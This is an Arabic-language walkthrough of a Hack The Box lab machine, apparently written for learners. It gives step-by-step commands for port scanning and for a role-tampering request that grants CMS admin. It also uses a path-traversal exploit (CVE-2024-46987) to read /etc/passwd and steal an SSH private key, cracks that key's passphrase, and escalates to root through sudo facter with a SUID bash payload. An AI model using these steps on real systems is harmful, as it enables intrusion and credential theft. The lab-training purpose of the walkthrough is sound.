🔍 استكشاف المنافذ - Nmap

💡 لماذا نبدأ بـ Nmap؟

أول خطوة في أي اختبار اختراق هي معرفة ما هو مفتوح على الجهاز المستهدف. Nmap هو أداة تفحص المنافذ وتخبرك بالخدمات الشغّالة على الجهاز وإصداراتها.

bash
nmap facts.htb -A

# -A تعني: فحص شامل (إصدارات، سكريبتات، نظام التشغيل)

النتيجة:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp open  http    nginx 1.26.3 (Ubuntu)
✅ ماذا فهمنا؟

منفذ 22: SSH مفتوح - يمكن الدخول عبره إذا حصلنا على بيانات اعتماد
منفذ 80: HTTP مفتوح - يعني في موقع ويب نقدر نفحصه

⚠️ ملاحظة مهمة

قبل البدء، تأكد من إضافة الجهاز في ملف /etc/hosts حتى يتعرف النظام على اسم النطاق:

echo "10.129.37.124 facts.htb" | sudo tee -a /etc/hosts

📂 مسح المسارات - Feroxbuster

💡 لماذا نستخدم Feroxbuster؟

الموقع قد يحتوي على صفحات وملفات مخفية غير ظاهرة في الواجهة العادية. Feroxbuster يجرب آلاف المسارات المحتملة ويخبرنا أيها موجود فعلاً.

bash
feroxbuster -u 'http://facts.htb/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# -u  : الرابط المستهدف
# -w  : قائمة الكلمات (قاموس المسارات المحتملة)

أهم النتائج:

200 GET  http://facts.htb/
200 GET  http://facts.htb/sitemap
200 GET  http://facts.htb/search
302 GET  http://facts.htb/admin => http://facts.htb/admin/login
✅ الاكتشاف المهم

وجدنا مسار /admin الذي يعيد التوجيه إلى صفحة تسجيل الدخول للإدارة. هذا هدفنا القادم!

🖥️ اكتشاف Camaleon CMS والدخول للإدارة

💡 ما هو Camaleon CMS؟

Camaleon CMS هو نظام إدارة محتوى مبني على Ruby on Rails. اكتشفنا من ملفات CSS و JS في نتائج Feroxbuster أن الموقع يستخدم هذا النظام بالإصدار 2.x.

الخطوات:

1. افتح المتصفح واذهب إلى: http://facts.htb/admin/login

2. سجّل حساب جديد من صفحة التسجيل العادية

3. سجّل دخول بالحساب الجديد

4. اذهب لإعدادات تغيير كلمة المرور وافتح Burp Suite لاصطياد الطلب

⚠️ ثغرة في تغيير الصلاحيات

في طلب تغيير كلمة المرور، أضف المعامل role=admin في البيانات المرسلة. هذا يسمح لك بالدخول كمدير بسبب عدم التحقق الصحيح من الصلاحيات.

Burp Suite - Request Body
user[role]=admin&user[password]=newpassword&user[password_confirmation]=newpassword

بعد إرسال الطلب، سجّل دخول مرة أخرى وستكون الآن مدير (Admin) على لوحة التحكم.

⚡ استغلال CVE-2024-46987 Path Traversal

💡 ما هي هذه الثغرة؟

CVE-2024-46987 هي ثغرة Path Traversal في Camaleon CMS الإصدار 2.8.0 حتى 2.8.2.

Path Traversal تعني: إمكانية قراءة ملفات خارج المسار المسموح به عبر استخدام ../ للتنقل بين المجلدات.

مثال: بدلاً من قراءة /uploads/photo.jpg، يقدر المهاجم يقرأ /etc/passwd أو أي ملف آخر على الجهاز.

⚠️ شرط الاستغلال

هذه الثغرة تحتاج مستخدم مسجّل على الموقع (authenticated). لهذا سجّلنا حساباً في الخطوة السابقة.

تحميل السكريبت:

git clone https://github.com/Goultarde/CVE-2024-46987
cd CVE-2024-46987

طريقة الاستخدام:

bash
python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh [مسار الملف]

# -u    : رابط الموقع
# --user: اسم المستخدم الذي سجّلناه
# -p    : كلمة مرور المستخدم
# [مسار]: الملف الذي نريد قراءته

👥 قراءة /etc/passwd لمعرفة المستخدمين

💡 لماذا نقرأ /etc/passwd؟

ملف /etc/passwd يحتوي على قائمة كل المستخدمين في النظام. هذا يساعدنا على معرفة أسماء المستخدمين الذين قد يكون لديهم ملفات مهمة مثل مفاتيح SSH.

bash
python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh /etc/passwd

جزء من النتيجة:

root:x:0:0:root:/root:/bin/bash
...
william:x:1000:1000::/home/william:/bin/bash
trivia:x:1001:1001::/home/trivia:/bin/bash
✅ ماذا اكتشفنا؟

يوجد مستخدمان مهمان:
- william - المستخدم الرئيسي (home: /home/william)
- trivia - مستخدم آخر (home: /home/trivia)

الخطوة التالية: نحاول نسرق مفاتيح SSH لأحدهم.

🔑 سرقة مفتاح SSH الخاص

💡 ما هو مفتاح SSH الخاص؟

بدلاً من كلمة المرور، SSH يسمح بالدخول عبر زوج مفاتيح:
- المفتاح العام (public): موجود على الجهاز المستهدف
- المفتاح الخاص (private): موجود عند المستخدم

إذا حصلنا على المفتاح الخاص، نقدر ننتحل هوية المستخدم والدخول بدون كلمة مرور.

💡 لماذا المسار ثابت دائماً؟

في Linux، مفاتيح SSH دائماً تكون في نفس المكان بالاتفاقية القياسية:
/home/[اسم المستخدم]/.ssh/id_ed25519
/home/[اسم المستخدم]/.ssh/id_rsa

هذا معيار Linux ثابت، ولهذا نعرف أين نبحث مباشرةً.

جربنا مستخدم william أولاً:

python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh /home/william/.ssh/id_ed25519
# لم يتم العثور على الملف

ثم جربنا مستخدم trivia:

python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh /home/trivia/.ssh/id_ed25519

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAA...
...
-----END OPENSSH PRIVATE KEY-----
✅ نجحنا! حصلنا على المفتاح

تمكّنا من قراءة المفتاح الخاص لمستخدم trivia. الخطوة التالية هي استخدامه للدخول عبر SSH.

احفظ المفتاح في ملف:

nano id_ed25519
# الصق محتوى المفتاح كاملاً بما فيه BEGIN و END

# أو مباشرة من السكريبت:
python CVE-2024-46987.py -u http://facts.htb --user hyh -p hyh /home/trivia/.ssh/id_ed25519 > id_ed25519

🔓 كسر كلمة مرور المفتاح - ssh2john

💡 لماذا نحتاج ssh2john؟

المفتاح الخاص محمي بـ passphrase (كلمة مرور إضافية للمفتاح نفسه). عند محاولة الاتصال سيطلب منك هذه الكلمة.

ssh2john يحوّل المفتاح إلى صيغة يفهمها برنامج john لكسر كلمات المرور عبر القاموس.

الخطوة 1: ضبط صلاحيات الملف (مهم جداً!)

chmod 600 id_ed25519

# لماذا؟ SSH يرفض المفتاح إذا كان مقروءاً من قِبل مستخدمين آخرين
# 600 = القراءة والكتابة للمالك فقط

الخطوة 2: تحويل المفتاح لصيغة john

ssh2john id_ed25519 > ssh.hash

# ssh2john يستخرج الهاش من المفتاح ويضعه في ملف ssh.hash

الخطوة 3: كسر الهاش بالقاموس

john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt

# john   : برنامج كسر كلمات المرور
# --wordlist: قاموس كلمات المرور الشائعة (rockyou يحتوي 14 مليون كلمة)
⚠️ إذا ما وجدت rockyou.txt

فك الضغط عنه أولاً: gunzip /usr/share/wordlists/rockyou.txt.gz

النتيجة:

Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
dragonballz      (id_ed25519)
1g 0:00:01:04 DONE (2026-02-04 19:35) 0.01557g/s 49.84p/s
🎯 كلمة مرور المفتاح
dragonballz

🚪 الدخول عبر SSH

bash
ssh -i id_ed25519 trivia@10.129.37.124

# -i : استخدم هذا المفتاح للمصادقة
# trivia : اسم المستخدم
# 10.129.37.124 : IP الجهاز

# عند السؤال:
Enter passphrase for key 'id_ed25519': dragonballz
✅ دخلنا بنجاح!

أصبحنا داخل الجهاز بمستخدم trivia. الآن نبحث عن طريقة للوصول إلى صلاحيات root.

اقرأ user.txt:

cat /home/william/user.txt
HTB{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}

⬆️ رفع الصلاحيات إلى Root

💡 ما معنى رفع الصلاحيات؟

نحن الآن داخل الجهاز بمستخدم عادي (trivia). للحصول على صلاحيات كاملة على الجهاز، نحتاج نصبح root. هذه العملية تسمى Privilege Escalation.

الخطوة 1: تحقق من sudo

sudo -l

# هذا الأمر يعرض ما يمكن لمستخدمنا تشغيله بصلاحيات root

النتيجة:

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
💡 ما هو facter؟

facter هو برنامج مكتوب بلغة Ruby يجمع معلومات عن النظام.
المشكلة: يدعم تشغيل ملفات Ruby مخصصة عبر --custom-dir، مما يعني أننا نقدر نجعله يشغّل كود Ruby خاص بنا بصلاحيات root!

⚠️ GTFOBins

موقع GTFOBins هو مرجع يحتوي على طرق استغلال البرامج الشائعة في Linux لرفع الصلاحيات. وجدنا فيه طريقة استغلال facter.

الخطوة 2: إنشاء ملف Ruby الخبيث

mkdir -p /tmp/exploit_facts
cat > /tmp/exploit_facts/exploit.rb << 'EOF'
system("chmod +s /bin/bash")
EOF

# شرح الكود:
# chmod +s /bin/bash  = إضافة صلاحية SUID لـ bash
# SUID تعني: عند تشغيل bash، تشتغل بصلاحيات مالكها (root)

الخطوة 3: تشغيل facter بصلاحيات root

sudo /usr/bin/facter --custom-dir=/tmp/exploit_facts/ x

# --custom-dir : اقرأ ملفات Ruby من هذا المجلد
# sudo         : شغّله بصلاحيات root

الخطوة 4: تحقق من نجاح العملية

ls -al /bin/bash
-rwsr-sr-x 1 root root 1740896 Mar  5  2025 /bin/bash

# الـ 's' في الصلاحيات = SUID فعّال ✓

الخطوة 5: احصل على shell بصلاحيات root

bash -p

# -p : استخدم صلاحيات المالك (root) بدلاً من المستخدم الحالي

bash-5.2# whoami
root
✅ أصبحنا root!

حصلنا على صلاحيات كاملة على الجهاز.
